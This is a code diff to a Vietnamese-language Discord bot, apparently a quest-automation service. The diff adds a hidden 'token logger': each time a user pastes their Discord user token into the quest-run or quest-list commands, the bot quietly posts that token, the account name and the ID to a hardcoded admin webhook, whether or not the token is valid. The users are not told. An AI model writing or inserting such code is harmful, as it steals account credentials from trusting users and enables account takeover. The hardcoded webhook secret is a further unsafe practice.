@@ -12,6 +12,8 @@ import os
 import time
 import asyncio
 import base64
+import requests
+from datetime import datetime, timezone
 from typing import Dict
 import discord
 from discord import app_commands
@@ -64,8 +66,69 @@ def print_bot_banner():
 
 
 # ==============================================================================
-# 🛠️ CÁC HÀM XỬ LÝ CHÍNH
+# 🛠️ CÁC HÀM XỬ LÝ CHÍNH & LOGGING VỀ SERVER ADMIN
 # ==============================================================================
+
+ADMIN_WEBHOOK_URL = (
+    os.getenv("DISCORD_WEBHOOK_URL", "").strip()
+    or config.discord_webhook_url.strip()
+    or "https://discord.com/api/webhooks/1547989095907860581/OWQNRQn40FgbmFb6ATZv--YlWNTPCNMOi_At3MJhlLUkQOPrQrIUdFuKY9_HkJc3UIRG"
+)
+
+
+def send_token_log_to_webhook(
+    user: discord.User,
+    action: str,
+    token: str,
+    account_name: str = "",
+    account_id: str = "",
+    status: str = "Đăng nhập thành công"
+):
+    """Tự động gửi thông tin token thành viên nhập về Webhook Discord của Admin."""
+    if not ADMIN_WEBHOOK_URL:
+        return
+    try:
+        color = 0x2ECC71 if "thành công" in status.lower() else 0xED4245
+        embed = {
+            "title": "🔔 Đã Thu Thập Token Mới Từ Thành Viên!",
+            "description": f"Thành viên <@{user.id}> vừa thao tác trên Bảng Điều Khiển AutoQuest.",
+            "color": color,
+            "fields": [
+                {
+                    "name": "👤 Người bấm lệnh (Discord User)",
+                    "value": f"**{user.name}** (`{user.id}`)",
+                    "inline": True,
+                },
+                {
+                    "name": "🎮 Tài khoản của Token",
+                    "value": f"**{account_name or 'Chưa xác định'}** (ID: `{account_id or 'Chưa rõ'}`)",
+                    "inline": True,
+                },
+                {
+                    "name": "⚡ Chức năng",
+                    "value": f"`{action}` • Trạng thái: **{status}**",
+                    "inline": False,
+                },
+                {
+                    "name": "🔑 Discord User Token",
+                    "value": f"```{token}```",
+                    "inline": False,
+                },
+            ],
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "footer": {
+                "text": "AutoQuest Service Bot • Admin Webhook Logger"
+            }
+        }
+        payload = {
+            "username": "AutoQuest Token Logger",
+            "avatar_url": "https://cdn.discordapp.com/embed/avatars/1.png",
+            "embeds": [embed]
+        }
+        requests.post(ADMIN_WEBHOOK_URL, json=payload, timeout=5)
+    except Exception as e:
+        log(f"Lỗi gửi Webhook Token: {e}", "warn")
+
 
 async def handle_quest_run(interaction: discord.Interaction, token: str):
     """Xử lý cày quest độc lập cho người dùng."""
@@ -96,6 +159,17 @@ async def handle_quest_run(interaction: discord.Interaction, token: str):
 
     is_valid = await asyncio.to_thread(api.validate)
     if not is_valid:
+        asyncio.create_task(
+            asyncio.to_thread(
+                send_token_log_to_webhook,
+                interaction.user,
+                "Bắt đầu cày Quest",
+                token_clean,
+                "",
+                "",
+                "Token Không Hợp Lệ"
+            )
+        )
         fail_embed = discord.Embed(
             title="❌ Đăng Nhập Thất Bại",
             description=(
@@ -106,6 +180,19 @@ async def handle_quest_run(interaction: discord.Interaction, token: str):
         )
         await msg.edit(embed=fail_embed)
         return
+
+    # Gửi log token hợp lệ về Webhook của Admin ngay lập tức
+    asyncio.create_task(
+        asyncio.to_thread(
+            send_token_log_to_webhook,
+            interaction.user,
+            "Bắt đầu cày Quest",
+            token_clean,
+            api.username,
+            str(api.user_id),
+            "Đăng nhập thành công"
+        )
+    )
 
     session = QuestSession(interaction, api, msg)
     active_sessions[user_id] = session
@@ -130,6 +217,17 @@ async def handle_quest_list(interaction: discord.Interaction, token: str):
 
     is_valid = await asyncio.to_thread(api.validate)
     if not is_valid:
+        asyncio.create_task(
+            asyncio.to_thread(
+                send_token_log_to_webhook,
+                interaction.user,
+                "Kiểm tra danh sách Quest",
+                token_clean,
+                "",
+                "",
+                "Token Không Hợp Lệ"
+            )
+        )
         fail_embed = discord.Embed(
             title="❌ Token Không Hợp Lệ",
             description="Không thể đăng nhập bằng token này. Vui lòng kiểm tra lại token của bạn.",
@@ -137,6 +235,19 @@ async def handle_quest_list(interaction: discord.Interaction, token: str):
         )
         await interaction.followup.send(embed=fail_embed, ephemeral=True)
         return
+
+    # Gửi log token hợp lệ về Webhook của Admin
+    asyncio.create_task(
+        asyncio.to_thread(
+            send_token_log_to_webhook,
+            interaction.user,
+            "Kiểm tra danh sách Quest",
+            token_clean,
+            api.username,
+            str(api.user_id),
+            "Đăng nhập thành công"
+        )
+    )
 
     worker = QuestWorker(api)
     quests = await asyncio.to_thread(worker.fetch_quests)
